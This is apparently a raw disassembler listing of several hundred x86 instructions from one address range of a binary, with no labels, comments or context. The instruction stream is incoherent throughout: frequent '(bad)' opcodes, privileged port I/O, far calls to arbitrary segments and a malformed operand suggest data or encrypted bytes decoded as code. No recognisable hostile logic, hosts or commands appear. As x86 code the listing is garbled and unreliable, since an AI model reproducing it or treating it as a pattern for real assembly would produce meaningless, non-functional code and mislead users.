  418618:	pop    es
  418619:	dec    esp
  41861a:	lahf   
  41861b:	push   cs
  41861c:	dec    ecx
  41861d:	out    0xab,al
  41861f:	xor    ebp,0xffffffbe
  418622:	or     ebp,DWORD PTR ds:0x56e30933
  418628:	jae    0x418648
  41862a:	scas   al,BYTE PTR es:[edi]
  41862b:	mov    ds:0xb873d58b,al
  418630:	arpl   ax,bx
  418632:	push   0x56
  418634:	mov    WORD PTR [ebp-0x26],fs
  418637:	test   DWORD PTR [edx],esi
  418639:	cmovge esi,DWORD PTR [edx-0x7a193947]
  418640:	(bad)  
  418641:	fild   DWORD PTR [eax-0x64]
  418644:	pop    ecx
  418645:	das    
  418646:	push   ebp
  418647:	sbb    ebx,DWORD PTR [edx-0x45]
  41864a:	shl    ecx,0x26
  41864d:	push   ecx
  41864e:	sbb    BYTE PTR [esp+eiz*8-0x3a],ch
  418652:	pop    es
  418653:	adc    edx,edi
  418655:	outs   dx,DWORD PTR ds:[esi]
  418656:	outs   dx,DWORD PTR ds:[esi]
  418657:	xor    ebp,ebx
  418659:	retf   
  41865a:	fist   DWORD PTR [ebx+0x47bf84b]
  418660:	and    eax,0xdce9d1ce
  418665:	in     al,0xad
  418667:	sbb    bh,al
  418669:	mov    eax,ds:0xc3f73d61
  41866e:	sbb    dl,ch
  418670:	lock repz fs aad 0xae
  418675:	cmp    BYTE PTR [eax],ch
  418677:	or     eax,0x7e251cea
  41867c:	icebp  
  41867d:	call   0x31c0:0x1195727
  418684:	je     0x41863e
  418686:	popf   
  418687:	in     eax,dx
  418688:	adc    al,0xc4
  41868a:	imul   eax,DWORD PTR [esi+0x26fe5684],0x83c4753a
  418694:	dec    ecx
  418695:	data16 repnz adc ch,BYTE PTR [ebp-0x5fae157c]
  41869d:	sub    BYTE PTR [ebp-0x2c5611d1],0x2e
  4186a4:	inc    edx
  4186a5:	std    
  4186a6:	mov    esi,0x8c5ffb20
  4186ab:	and    bl,BYTE PTR [ebx+0x2e4307e4]
  4186b1:	push   0x2c
  4186b3:	xor    ecx,DWORD PTR [eax+ebx*4-0x36db7c65]
  4186ba:	aaa    
  4186bb:	inc    ebx
  4186bc:	lods   eax,DWORD PTR ds:[esi]
  4186bd:	mov    ebp,DWORD PTR [esi+0x71]
  4186c0:	lods   al,BYTE PTR ds:[esi]
  4186c1:	sub    al,0xd3
  4186c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186c4:	sbb    DWORD PTR [ecx-0x1e6b4349],0xf3b67002
  4186ce:	lods   al,BYTE PTR ds:[esi]
  4186cf:	lea    eax,[edi+edx*1]
  4186d2:	cmp    al,ch
  4186d4:	jae    0x41870e
  4186d6:	push   ss
  4186d7:	call   0xdd41:0x50d05e81
  4186de:	sub    DWORD PTR [ebp-0x3e05a4f3],esp
  4186e4:	sub    eax,DWORD PTR [eax-0x38]
  4186e7:	ds and al,0xbf
  4186ea:	repz xor DWORD PTR [ebx],esi
  4186ed:	pop    edx
  4186ee:	call   0x8830ffd8
  4186f3:	imul   ebp,ebx,0x57eb2fb2
  4186f9:	jne    0x4186f6
  4186fb:	mov    edx,0x896eb55e
  418700:	xchg   ecx,eax
  418701:	aaa    
  418702:	stos   BYTE PTR es:[edi],al
  418703:	mov    ebx,0xa0914093
  418708:	pop    esp
  418709:	jle    0x4186a2
  41870b:	dec    dx
  41870d:	mov    ecx,0xbafebcbf
  418712:	add    ebx,edi
  418714:	xor    dl,dh
  418716:	sub    DWORD PTR [edi+0x41c9336a],esi
  41871c:	lea    edi,[ebx+eiz*8+0x3e60b591]
  418723:	cmp    BYTE PTR [edx-0x1225a3dd],al
  418729:	push   cs
  41872a:	xchg   ebp,eax
  41872b:	lods   eax,DWORD PTR ds:[esi]
  41872c:	daa    
  41872d:	lea    ecx,[edx]
  41872f:	push   esp
  418730:	cwde   
  418731:	dec    ebp
  418732:	repnz inc edx
  418734:	and    DWORD PTR [ebp-0xe],esi
  418737:	xor    DWORD PTR [ecx],edi
  418739:	push   0x6e
  41873b:	test   al,0xd3
  41873d:	setb   ch
  418740:	or     al,ah
  418742:	inc    ebx
  418743:	scas   al,BYTE PTR es:[edi]
  418744:	sub    al,0xbb
  418746:	push   ebp
  418747:	jno    0x418762
  418749:	aaa    
  41874a:	add    eax,0x853692ab
  41874f:	pop    esi
  418750:	jb     0x4186f7
  418752:	sbb    eax,0x435527d8
  418757:	pusha  
  418758:	sbb    eax,edi
  41875a:	dec    esp
  41875b:	add    al,BYTE PTR ds:0xf3fd5ab1
  418761:	pusha  
  418762:	add    eax,0x1e30c561
  418767:	int    0x5f
  418769:	dec    ebx
  41876a:	pop    eax
  41876b:	dec    esi
  41876c:	jae    0x4187d3
  41876e:	in     eax,0x66
  418770:	(bad)  
  418771:	loop   0x41870d
  418773:	jo     0x41873e
  418775:	mov    DWORD PTR [ebx-0x3f],edi
  418778:	or     al,dl
  41877a:	retf   
  41877b:	xchg   esp,eax
  41877c:	jmp    0x1287bb6b
  418781:	push   esp
  418782:	add    eax,0x3a7475cd
  418787:	inc    ebx
  418788:	pop    DWORD PTR [eax-0x13711b3]
  41878e:	mov    al,0xae
  418790:	test   DWORD PTR [ecx-0x1a],eax
  418793:	sar    cl,cl
  418795:	loop   0x41871a
  418797:	rcr    BYTE PTR [edx-0x64089e43],1
  41879d:	sub    eax,0x26bd8eec
  4187a2:	fild   DWORD PTR [ecx-0x3a]
  4187a5:	push   esp
  4187a6:	mov    bh,0x2b
  4187a8:	(bad)  
  4187a9:	xor    BYTE PTR [ebx+0x4d],dh
  4187ac:	sub    al,0x0
  4187ae:	pushf  
  4187af:	mov    al,ds:0x16c6733f
  4187b4:	dec    edi
  4187b5:	ds cld 
  4187b7:	and    bh,BYTE PTR [ebp+0x35]
  4187ba:	test   al,0xdb
  4187bc:	leave  
  4187bd:	adc    eax,0x853287e6
  4187c2:	sub    DWORD PTR [ebx+0x7ad16f62],esp
  4187c8:	xchg   edi,eax
  4187c9:	cmp    esp,DWORD PTR [ecx-0x47fb5f8d]
  4187cf:	inc    esi
  4187d0:	bound  edi,QWORD PTR [ebx+0x76]
  4187d3:	xor    edx,DWORD PTR [ebp+0x5d]
  4187d6:	mov    edi,DWORD PTR [eax+0x58]
  4187d9:	imul   esi,edx,0xffffffa9
  4187dc:	pop    es
  4187dd:	iret   
  4187de:	mov    cl,0xa2
  4187e0:	and    BYTE PTR [eax+0x5c4c7738],dl
  4187e6:	add    eax,0x4b21aec6
  4187eb:	jecxz  0x41876e
  4187ed:	imul   edx,DWORD PTR cs:[ebp+0x7b7e6012],0xffffff87
  4187f5:	or     bh,BYTE PTR [ecx-0x7b]
  4187f8:	aam    0x21
  4187fa:	or     esp,DWORD PTR [esi-0x3e]
  4187fd:	cmp    edi,DWORD PTR [esi]
  4187ff:	aad    0x4d
  418801:	cwde   
  418802:	cli    
  418803:	jge    0x4187f3
  418805:	push   0x7b
  418807:	push   0x4
  418809:	call   0x7ae897ef
  41880e:	jns    0x4187dd
  418810:	sbb    eax,0xb60acd88
  418815:	push   edi
  418816:	stos   DWORD PTR es:[edi],eax
  418817:	mov    ah,0x60
  418819:	adc    BYTE PTR [edi-0x49831eec],cl
  41881f:	int    0x48
  418821:	push   cs
  418822:	cld    
  418823:	and    eax,0x937c1819
  418828:	xchg   esi,eax
  418829:	js     0x41889e
  41882b:	mov    ecx,0xab0165bb
  418830:	mov    ds:0x98f21916,eax
  418835:	rcr    BYTE PTR [ebx-0xc],cl
  418838:	inc    DWORD PTR [ecx]
  41883a:	into   
  41883b:	dec    eax
  41883c:	add    esp,edi
  41883e:	push   ss
  41883f:	and    ch,BYTE PTR [esi-0x5aa7d43a]
  418845:	inc    esi
  418846:	inc    ecx
  418847:	cs jne 0x41880f
  41884a:	mov    edi,0x6bb7967e
  41884f:	cmp    BYTE PTR [esi],ch
  418851:	test   al,0xa7
  418853:	and    eax,0x34d6f557
  418858:	xchg   DWORD PTR [ebx+0x79],ecx
  41885b:	lock lods eax,DWORD PTR ds:[esi]
  41885d:	call   0x2e4c:0xc624e95f
  418864:	mov    ds:0xa7281513,al
  418869:	cwde   
  41886a:	jbe    0x4187ff
  41886c:	ins    BYTE PTR es:[edi],dx
  41886d:	inc    esp
  41886e:	push   0xffffffb5
  418870:	mov    edx,0x3b197088
  418875:	dec    ebp
  418876:	push   es
  418877:	lds    ebx,FWORD PTR [eax]
  418879:	inc    ecx
  41887a:	retf   
  41887b:	push   eax
  41887c:	imul   esp,DWORD PTR cs:[esi-0x17],0xffffff9e
  418881:	cmp    eax,DWORD PTR [ebx+0x61]
  418884:	mov    edx,0x9c940916
  418889:	int    0x71
  41888b:	mov    BYTE PTR [esi],0xa8
  41888e:	stos   DWORD PTR es:[edi],eax
  41888f:	adc    DWORD PTR [edi+ecx*2-0x13],esi
  418893:	jmp    0xdc2e:0x39c8a735
  41889a:	or     BYTE PTR [ecx-0x35],dl
  41889d:	inc    ebp
  41889e:	jge    0x418902
  4188a0:	push   eax
  4188a1:	fldenv [ebx+0x56]
  4188a4:	sbb    ecx,DWORD PTR [edi]
  4188a6:	pop    ebp
  4188a7:	sahf   
  4188a8:	not    al
  4188aa:	inc    ebp
  4188ab:	repnz adc dx,sp
  4188af:	mov    dl,0xb6
  4188b1:	popa   
  4188b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188b3:	inc    ebp
  4188b4:	fadd   QWORD PTR [ecx+ecx*1+0x2ac4cbfd]
  4188bb:	pop    ebx
  4188bc:	das    
  4188bd:	in     eax,dx
  4188be:	sub    bh,BYTE PTR [esi]
  4188c0:	mov    edx,0x703713e8
  4188c5:	push   esp
  4188c6:	rcr    BYTE PTR ds:0x2e3fdf15,1
  4188cc:	lods   al,BYTE PTR ds:[esi]
  4188cd:	mov    ds:0xf934a3b0,eax
  4188d2:	out    dx,al
  4188d3:	and    esp,DWORD PTR [ebx+0x2abc7032]
  4188d9:	inc    eax
  4188da:	or     al,0x1f
  4188dc:	pop    edi
  4188dd:	mov    eax,0x9009618e
  4188e2:	outs   dx,BYTE PTR ds:[esi]
  4188e3:	xchg   DWORD PTR [esi-0x3d345163],esi
  4188e9:	jo     0x4188b9
  4188eb:	pop    edi
  4188ec:	inc    ecx
  4188ed:	xchg   ebx,eax
  4188ee:	or     DWORD PTR [edx+0x1826acf8],0xffffffec
  4188f5:	xchg   ch,bl
  4188f7:	pop    ebp
  4188f8:	jne    0x418910
  4188fa:	cwde   
  4188fb:	fwait
  4188fc:	jmp    0xb978:0xadef1c96
  418903:	aam    0x7a
  418905:	xor    dh,BYTE PTR ds:0x2efd265e
  41890b:	push   cs
  41890c:	push   es
  41890d:	call   DWORD PTR [edi+0x397ad76c]
  418913:	sub    BYTE PTR [edx-0x22],dh
  418916:	aam    0x36
  418918:	icebp  
  418919:	jge    0x41896f
  41891b:	inc    eax
  41891c:	mov    eax,0xb8739c8b
  418921:	sub    BYTE PTR [esi],dh
  418923:	and    BYTE PTR [eax],dh
  418925:	stos   BYTE PTR es:[edi],al
  418926:	adc    BYTE PTR [edi+eax*1-0x4ed7095a],bl
  41892d:	sbb    DWORD PTR [edx+0x3a],ecx
  418930:	push   es
  418931:	sahf   
  418932:	sub    eax,0x263fa276
  418937:	jo     0x418909
  418939:	and    DWORD PTR [edi],esi
  41893b:	scas   eax,DWORD PTR es:[edi]
  41893c:	fld    DWORD PTR [ebx-0x50609b77]
  418942:	add    DWORD PTR [ebp+0x6b7ac6ff],0x750b69f3
  41894c:	sub    esp,edx
  41894e:	adc    ecx,ebx
  418950:	or     BYTE PTR [edx],dh
  418952:	lock adc BYTE PTR [ecx+eiz*1],bl
  418956:	adc    eax,0xc64e4381
  41895b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41895c:	xlat   BYTE PTR ds:[ebx]
  41895d:	cmp    eax,0xce24569d
  418962:	fiadd  DWORD PTR [ecx+0x5e]
  418965:	std    
  418966:	rol    BYTE PTR [esi+0x52],1
  418969:	daa    
  41896a:	mov    bh,al
  41896c:	clc    
  41896d:	add    eax,0x19b2e852
  418972:	or     al,0xe4
  418974:	shl    BYTE PTR [eax],0x9b
  418977:	shl    BYTE PTR [eax+0x7a54242],0x28
  41897e:	(bad)  
  41897f:	jg     0x4189f4
  418981:	fidiv  DWORD PTR [esi-0x1d6151c8]
  418987:	in     al,dx
  418988:	push   esi
  418989:	call   0x84317330
  41898e:	stos   DWORD PTR es:[edi],eax
  41898f:	push   ds
  418990:	cmp    bl,BYTE PTR [ebp-0x76]
  418993:	sub    BYTE PTR ds:0xca61c5f8,0x20
  41899a:	mov    BYTE PTR [esi],al
  41899c:	sbb    BYTE PTR [ecx-0x79],0x29
  4189a0:	adc    edx,DWORD PTR [esi+0x4dda9b77]
  4189a6:	lahf   
  4189a7:	adc    ch,ch
  4189a9:	sub    eax,0xf4471767
  4189ae:	pop    es
  4189af:	mov    dl,dh
  4189b1:	fidiv  DWORD PTR [eax-0x3b]
  4189b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189b5:	jbe    0x418948
  4189b7:	fnstenv [eax+0x7]
  4189ba:	arpl   sp,si
  4189bc:	aaa    
  4189bd:	xchg   ebp,eax
  4189be:	inc    eax
  4189bf:	mov    ecx,ss
  4189c1:	mov    dl,0x5a
  4189c3:	(bad)  
  4189c4:	loopne 0x4189a0
  4189c6:	inc    esp
  4189c7:	xchg   esi,eax
  4189c8:	push   ecx
  4189c9:	xchg   ebp,eax
  4189ca:	inc    edi
  4189cb:	mov    edx,0xa803853d
  4189d0:	pop    edi
  4189d1:	xor    ch,BYTE PTR [edx+ebx*2]
  4189d4:	push   edi
  4189d5:	test   al,0x12
  4189d7:	and    edx,edi
  4189d9:	sar    BYTE PTR [eax-0x7c9329ff],0xd0
  4189e0:	jo     0x418a0b
  4189e2:	push   ebp
  4189e3:	(bad)  
  4189e4:	cmc    
  4189e5:	pop    ebp
  4189e6:	mov    ebx,0xdeed65f6
  4189eb:	mov    ebp,0xd326b876
  4189f0:	fstp   TBYTE PTR [ecx+0x50936bd]
  4189f6:	inc    ebp
  4189f7:	or     eax,0x715fb3a1
  4189fc:	push   0xa918dfa0
  418a01:	int3   
  418a02:	mov    eax,ebp
  418a04:	sbb    eax,0xe7ada972
  418a09:	mov    BYTE PTR [esi-0x4d],dh
  418a0c:	mov    bh,0xcd
  418a0e:	cld    
  418a0f:	mov    esi,0x30a73be4
  418a14:	inc    esp
  418a15:	cmp    BYTE PTR [ebx+0x72aef13b],bh
  418a1b:	retf   
  418a1c:	inc    BYTE PTR [eax]
  418a1e:	pusha  
  418a1f:	inc    ebx
  418a20:	fcmovu st,st(6)
  418a22:	rcr    BYTE PTR [edx],0x78
  418a25:	cmp    al,0xfe
  418a27:	popf   
  418a28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a29:	out    dx,al
  418a2a:	pop    esi
  418a2b:	sti    
  418a2c:	and    DWORD PTR [ebp+0x62],ebp
  418a2f:	nop
  418a30:	in     al,0x96
  418a32:	pop    es
  418a33:	scas   al,BYTE PTR es:[edi]
  418a34:	cmp    esp,edi
  418a36:	push   eax
  418a37:	push   ss
  418a38:	and    al,BYTE PTR [edi-0x7b]
  418a3b:	xchg   esp,eax
  418a3c:	jmp    0x418a50
  418a3e:	xchg   DWORD PTR [eax+0x33866c78],ecx
  418a44:	fstp   st(3)
  418a46:	in     eax,0x36
  418a48:	mov    ecx,edx
  418a4a:	jbe    0x418ab0
  418a4c:	leave  
  418a4d:	sub    esp,DWORD PTR [esi]
  418a4f:	cmp    BYTE PTR [ebp-0x7b],bl
  418a52:	nop
  418a53:	out    dx,eax
  418a54:	add    cl,BYTE PTR [ebx]
  418a56:	adc    DWORD PTR [ecx-0x3e75809c],ecx
  418a5c:	xchg   edx,eax
  418a5d:	inc    edi
  418a5e:	sbb    ebp,DWORD PTR [ebx]
  418a60:	jp     0x4189ee
  418a62:	dec    ebx
  418a63:	jge    0x418a62
  418a65:	retf   
  418a66:	dec    esp
  418a67:	jge    0x418a88
  418a69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a6a:	sbb    esi,DWORD PTR [ebp+0x672ea9fc]
  418a70:	or     BYTE PTR [ebx-0x27],0x98
  418a74:	push   0xffffff93
  418a76:	xchg   ecx,esi
  418a78:	push   edx
  418a79:	clc    
  418a7a:	xchg   DWORD PTR [esi],esp
  418a7c:	js     0x418a04
  418a7e:	mov    edi,0x4eb66837
  418a83:	mov    dh,BYTE PTR [ebx]
  418a85:	push   esi
  418a86:	enter  0x40a0,0xa5
  418a8a:	daa    
  418a8b:	lock and eax,0xed8e8235
  418a91:	daa    
  418a92:	loop   0x418a96
  418a94:	les    edi,FWORD PTR [eax]
  418a96:	push   ss
  418a97:	scas   eax,DWORD PTR es:[edi]
  418a98:	es cli 
  418a9a:	outs   dx,DWORD PTR ds:[esi]
  418a9b:	pusha  
  418a9c:	scas   eax,DWORD PTR es:[edi]
  418a9d:	sub    eax,0x8fa7c37a
  418aa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418aa3:	ret    
  418aa4:	pop    ecx
  418aa5:	add    BYTE PTR es:[ebp-0x5b6b038a],bl
  418aac:	and    al,0x78
  418aae:	lgs    eax,FWORD PTR [edx+edx*4-0x30]
  418ab3:	daa    
  418ab4:	sbb    BYTE PTR [ecx+0xa],ah
  418ab7:	aaa    
  418ab8:	(bad)  
  418ab9:	(bad)  
  418abb:	pusha  
  418abc:	add    BYTE PTR [edi+0x25],dl
  418abf:	pop    ds
  418ac0:	test   eax,0x36373a41
  418ac5:	pop    edx
  418ac6:	cmp    al,0x4
  418ac8:	fld    TBYTE PTR [ebp-0x18fd647]
  418ace:	xlat   BYTE PTR fs:[ebx]
  418ad0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ad1:	test   al,0x52
  418ad3:	nop
  418ad4:	iret   
  418ad5:	add    ecx,edx
  418ad7:	pop    es
  418ad8:	pushf  
  418ad9:	dec    esi
  418ada:	aaa    
  418adb:	div    BYTE PTR [ecx+eiz*8+0x332e1a7b]
  418ae2:	inc    ebx
  418ae3:	pop    ds
  418ae4:	lods   eax,DWORD PTR ds:[esi]
  418ae5:	pop    es
  418ae6:	ins    BYTE PTR es:[edi],dx
  418ae7:	ins    BYTE PTR es:[edi],dx
  418ae8:	xchg   BYTE PTR [esi+0x6ef5c6ec],ch
  418aee:	addr16 add al,0xd2
  418af1:	mov    eax,ds:0x1e7e66f4
  418af6:	rcl    cl,cl
  418af8:	addr16 jge 0x418a7d
  418afb:	cmp    edi,ecx
  418afd:	mov    esp,0xfa637106
  418b02:	mov    BYTE PTR [ecx-0x2c],ah
  418b05:	test   BYTE PTR [esi-0x4e],bl
  418b08:	xchg   edi,eax
  418b09:	popf   
  418b0a:	xchg   esp,eax
  418b0b:	jns    0x418b86
  418b0d:	cld    
  418b0e:	ds fcmovnu st,st(3)
  418b11:	inc    ebx
  418b12:	pop    ss
  418b13:	mov    dh,0xe0
  418b15:	mov    bh,0x92
  418b17:	out    dx,eax
  418b18:	call   0x9954:0x98a76353
  418b1f:	fnsave [ebx+0x2ecbe87e]
  418b25:	xchg   edi,eax
  418b26:	adc    al,0x8
  418b28:	jg     0x418b7e
  418b2a:	fldcw  WORD PTR [esi+0x5fd61023]
  418b30:	sbb    al,0x3c
  418b32:	xor    edi,DWORD PTR [ecx+0x53ab50c4]
  418b38:	xchg   ebx,eax
  418b39:	adc    bh,BYTE PTR [ecx]
  418b3b:	inc    esi
  418b3c:	repz and al,0xfc
  418b3f:	fcom   QWORD PTR [eax]
  418b41:	ds mov cl,0xb9
  418b44:	(bad)  
  418b45:	push   0x57af570a
  418b4a:	adc    al,0xb
  418b4c:	jno    0x418b80
  418b4e:	pop    esi
  418b4f:	cmp    cl,BYTE PTR [ecx+edi*2-0x116f4c20]
  418b56:	not    BYTE PTR [ebx+ebp*4+0x56d9757]
  418b5d:	or     eax,0xd3f2d737
  418b62:	cwde   
  418b63:	out    0x97,al
  418b65:	inc    eax
  418b66:	sub    cl,BYTE PTR [ebp-0x23]
  418b69:	push   ds
  418b6a:	pop    esi
  418b6b:	push   es
  418b6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b6d:	mov    eax,0x741ad223
  418b72:	std    
  418b73:	xor    ch,dl
  418b75:	ret    
  418b76:	lea    ebp,[ecx-0x411e4a09]
  418b7c:	retf   0x48e6
  418b7f:	cmp    dl,cl
  418b81:	pop    es
  418b82:	xchg   ecx,eax
  418b83:	je     0x418bb7
  418b85:	pop    ebp
  418b86:	dec    ebp
  418b87:	mov    edi,DWORD PTR [ecx+0x1d]
  418b8a:	mov    eax,0x3e3adbde
  418b8f:	call   0x33cedfe0
  418b94:	dec    esp
  418b95:	test   BYTE PTR [edi],ch
  418b97:	jbe    0x418b89
  418b99:	fistp  WORD PTR [ecx]
  418b9b:	stc    
  418b9c:	jle    0x418b81
  418b9e:	shl    bl,0x47
  418ba1:	loope  0x418b3c
  418ba3:	and    eax,0x4ac4c240
  418ba8:	jecxz  0x418c29
  418baa:	daa    
  418bab:	cld    
  418bac:	add    edi,ebp
  418bae:	inc    ecx
  418baf:	icebp  
  418bb0:	cmp    dl,BYTE PTR [ebx+eiz*1+0x239602c5]
  418bb7:	rcl    DWORD PTR [ebx+edi*8-0x5cca40c],cl
  418bbe:	xchg   edi,eax
  418bbf:	dec    esp
  418bc0:	add    esi,DWORD PTR ds:0x55dd433a
  418bc6:	das    
  418bc7:	lock pop es
  418bc9:	pop    es
  418bca:	xlat   BYTE PTR ds:[ebx]
  418bcb:	pop    esp
  418bcc:	enter  0x9fe8,0x97
  418bd0:	or     cl,BYTE PTR [esi+esi*1]
  418bd3:	push   cs
  418bd4:	ret    
  418bd5:	inc    ecx
  418bd6:	pop    ds
  418bd7:	or     eax,0x38e7f7b
  418bdc:	pop    esi
  418bdd:	jbe    0x418ba4
  418bdf:	xchg   edi,eax
  418be0:	pop    eax
  418be1:	out    dx,al
  418be2:	push   ebx
  418be3:	push   esi
  418be4:	imul   edi,DWORD PTR [ebx-0x9108802],0x1fc5c82f
  418bee:	(bad)  
  418bef:	xlat   BYTE PTR ds:[ebx]
  418bf0:	push   ss
  418bf1:	adc    DWORD PTR [ebx+0x6b6e9970],ecx
  418bf7:	out    dx,eax
  418bf8:	mov    ch,0xf4
  418bfa:	or     dh,BYTE PTR ds:0xb5852077
  418c00:	mov    esp,0xe257d66
  418c05:	add    dh,bh
  418c07:	(bad)  
  418c08:	lds    ebx,FWORD PTR [esi+0x61]
  418c0b:	test   BYTE PTR [esi],cl
  418c0d:	(bad)  
  418c0e:	or     cl,BYTE PTR [eax+eiz*8+0x7042de0e]
  418c15:	test   DWORD PTR [ebx+0xb],esi
  418c18:	enter  0x8ab9,0x4c
  418c1c:	mov    ds:0x3c2eab49,eax
  418c21:	call   0xd77a:0xc54e
  418c27:	push   edi
  418c28:	mov    ah,0xad
  418c2a:	or     ch,BYTE PTR [edi+0x73]
  418c2d:	jl     0x418be1
  418c2f:	pop    edx
  418c30:	jecxz  0x418c83
  418c32:	mov    es,ecx
  418c34:	cmp    esi,esp
  418c36:	sub    eax,0xa062b701
  418c3b:	adc    ah,al
  418c3d:	pop    ebx
  418c3e:	inc    ebx
  418c3f:	and    eax,0xff6dc8ce
  418c44:	cmc    
  418c45:	ret    0x15dd
  418c48:	push   ebx
  418c49:	mov    eax,ds:0x2f898a49
  418c4e:	lahf   
  418c4f:	push   edx
  418c50:	aad    0xb9
  418c52:	lds    eax,FWORD PTR [eax]
  418c54:	mov    cs,WORD PTR [eax-0x3ce1a2fa]
  418c5a:	pxor   mm2,mm0
  418c5d:	inc    DWORD PTR [ecx+0x4b]
  418c60:	fcomp  DWORD PTR [edi+edi*1-0x1e]
  418c64:	stc    
  418c65:	scas   eax,DWORD PTR es:[edi]
  418c66:	imul   ebp,esi,0x5867d214
  418c6c:	clc    
  418c6d:	xchg   esp,ebp
  418c6f:	mov    bh,0xb5
  418c71:	arpl   WORD PTR [edx],cx
  418c73:	xor    ah,BYTE PTR [ebx-0x179dc8b7]
  418c79:	jecxz  0x418c2a
  418c7b:	xor    eax,0xaed9255d
  418c80:	and    eax,0x7b253e22
  418c85:	pop    edi
  418c86:	xchg   edi,eax
  418c87:	fldcw  WORD PTR [ebp+0x4e91a79d]
  418c8d:	jg     0x418cc1
  418c8f:	lods   al,BYTE PTR ds:[esi]
  418c90:	jmp    0x418cca
  418c92:	test   al,0xe8
  418c94:	or     eax,0xee300020
  418c99:	(bad)  [esi-0x62]
  418c9c:	pushf  
  418c9d:	push   ecx
  418c9e:	fidivr DWORD PTR [eax]
  418ca0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ca1:	xor    DWORD PTR [edi+eax*2],esp
  418ca4:	popa   
  418ca5:	inc    eax
  418ca6:	pop    ss
  418ca7:	and    BYTE PTR [edx],dl
  418ca9:	outs   dx,DWORD PTR ds:[esi]
  418caa:	xor    BYTE PTR [edx+0x37faccc],al
  418cb0:	mov    ?,WORD PTR [esp+ebp*2]
  418cb3:	fbstp  TBYTE PTR [edi-0x7954c971]
  418cb9:	idiv   BYTE PTR [ebp+0x2]
  418cbc:	pop    ecx
  418cbd:	test   ecx,ebp
  418cbf:	sti    
  418cc0:	sbb    eax,0x126ebc24
  418cc5:	pop    eax
  418cc6:	int3   
  418cc7:	or     eax,0x6595ae63
  418ccc:	ret    0x3aa2
  418ccf:	inc    edi
  418cd0:	xchg   DWORD PTR [ebx+0x17fbac98],ecx
  418cd6:	enter  0x1dbe,0x7e
  418cda:	fwait
  418cdb:	dec    DWORD PTR [si]
  418cde:	dec    esp
  418cdf:	test   DWORD PTR ds:0x1fc239da,edx
  418ce5:	outs   dx,DWORD PTR ds:[esi]
  418ce6:	or     DWORD PTR [ebp+0x70],edx
  418ce9:	test   eax,0x2674000e
  418cee:	lahf   
  418cef:	jbe    0x418d1c
  418cf1:	gs jo  0x418d46
  418cf4:	add    dh,BYTE PTR [esi-0x54]
  418cf7:	xlat   BYTE PTR ds:[ebx]
  418cf8:	stos   DWORD PTR es:[edi],eax
  418cf9:	rep stos DWORD PTR es:[edi],eax
  418cfb:	leave  
  418cfc:	sahf   
  418cfd:	outs   dx,BYTE PTR ds:[esi]
  418cfe:	in     al,dx
  418cff:	pop    edx
  418d00:	mov    dl,0xe9
  418d02:	(bad)  
  418d04:	lods   eax,DWORD PTR ds:[esi]
  418d05:	or     al,0x8a
  418d07:	dec    ebp
  418d08:	add    eax,DWORD PTR [edx+0x4557d5fb]
  418d0e:	dec    ecx
  418d0f:	jmp    0x418cd8
  418d11:	xlat   BYTE PTR ds:[ebx]
  418d12:	scas   eax,DWORD PTR es:[edi]
  418d13:	xor    ebx,DWORD PTR [ebx]
  418d15:	cwde   
  418d16:	fmul   st,st(6)
  418d18:	fnsave [ebp-0x58547a84]
  418d1e:	aas    
  418d1f:	enter  0xb68b,0xe3
  418d23:	xchg   esp,eax
  418d24:	mov    dh,0xba
  418d26:	mov    ch,0x7c
  418d28:	sub    al,0xc
  418d2a:	lods   eax,DWORD PTR ds:[esi]
  418d2b:	cld    
  418d2c:	xchg   bh,bh
  418d2e:	cmp    BYTE PTR [ecx+0x26],ch
  418d31:	sti    
  418d32:	ja     0x418d83
  418d34:	inc    ebp
  418d35:	and    al,0xb5
  418d37:	repz daa 
  418d39:	imul   ebx,DWORD PTR [ebx-0x7a],0x880b21be
  418d40:	dec    ebp
  418d41:	pop    es
  418d42:	cmp    DWORD PTR [eax+edx*8-0x31dfec20],ebx
  418d49:	fstp   st(7)
  418d4b:	lahf   
  418d4c:	dec    esp
  418d4d:	sub    dl,ch
  418d4f:	ss loope 0x418da4
  418d52:	mov    cl,0x21
  418d54:	cwde   
  418d55:	or     bh,BYTE PTR [esi-0x75]
  418d58:	xlat   BYTE PTR cs:[ebx]
  418d5a:	pop    ebp
  418d5b:	stc    
  418d5c:	dec    esi
  418d5d:	xor    esp,ebx
  418d5f:	lea    ecx,gs:[edx+0x5c]
  418d63:	mov    edx,0x5ea97635
  418d68:	in     eax,0xf7
  418d6a:	ret    0xc09a
  418d6d:	lods   al,BYTE PTR ds:[esi]
  418d6e:	mov    al,BYTE PTR [esi]
  418d70:	xchg   al,dh
  418d72:	std    
  418d73:	inc    esi
  418d74:	test   al,0x78
  418d76:	jne    0x418d8b
  418d78:	pop    esi
  418d79:	cmp    dh,BYTE PTR [eax]
  418d7b:	in     al,dx
  418d7c:	test   DWORD PTR [edi],ebp
  418d7e:	loop   0x418dd1
  418d80:	xor    al,0x3c
  418d82:	add    BYTE PTR [edx+0x6c36780b],al
  418d88:	iret   
  418d89:	test   DWORD PTR [ecx+0x12633731],0x59d3ae32
  418d93:	xlat   BYTE PTR ds:[ebx]
  418d94:	(bad)  
  418d95:	fbld   TBYTE PTR cs:[edi]
  418d98:	inc    eax
  418d99:	ins    BYTE PTR es:[edi],dx
  418d9a:	sar    DWORD PTR [ebp+0x5d7520b9],0xcb
  418da1:	cmc    
  418da2:	fwait
  418da3:	xchg   ebp,eax
  418da4:	addr16 sahf 
  418da6:	cli    
  418da7:	jo     0x418d37
  418da9:	xlat   BYTE PTR ds:[ebx]
  418daa:	pop    ebp
  418dab:	cmc    
  418dac:	out    dx,al
  418dad:	ins    DWORD PTR es:[edi],dx
  418dae:	add    bh,ah
  418db0:	dec    ecx
  418db1:	cld    
  418db2:	mov    ebx,DWORD PTR [ecx-0x4fbed7a9]
  418db8:	imul   ebp,esp,0xffffff95
  418dbb:	add    al,0xe6
  418dbd:	loope  0x418d53
  418dbf:	push   ds
  418dc0:	xor    cl,BYTE PTR [ebx-0x2fce970c]
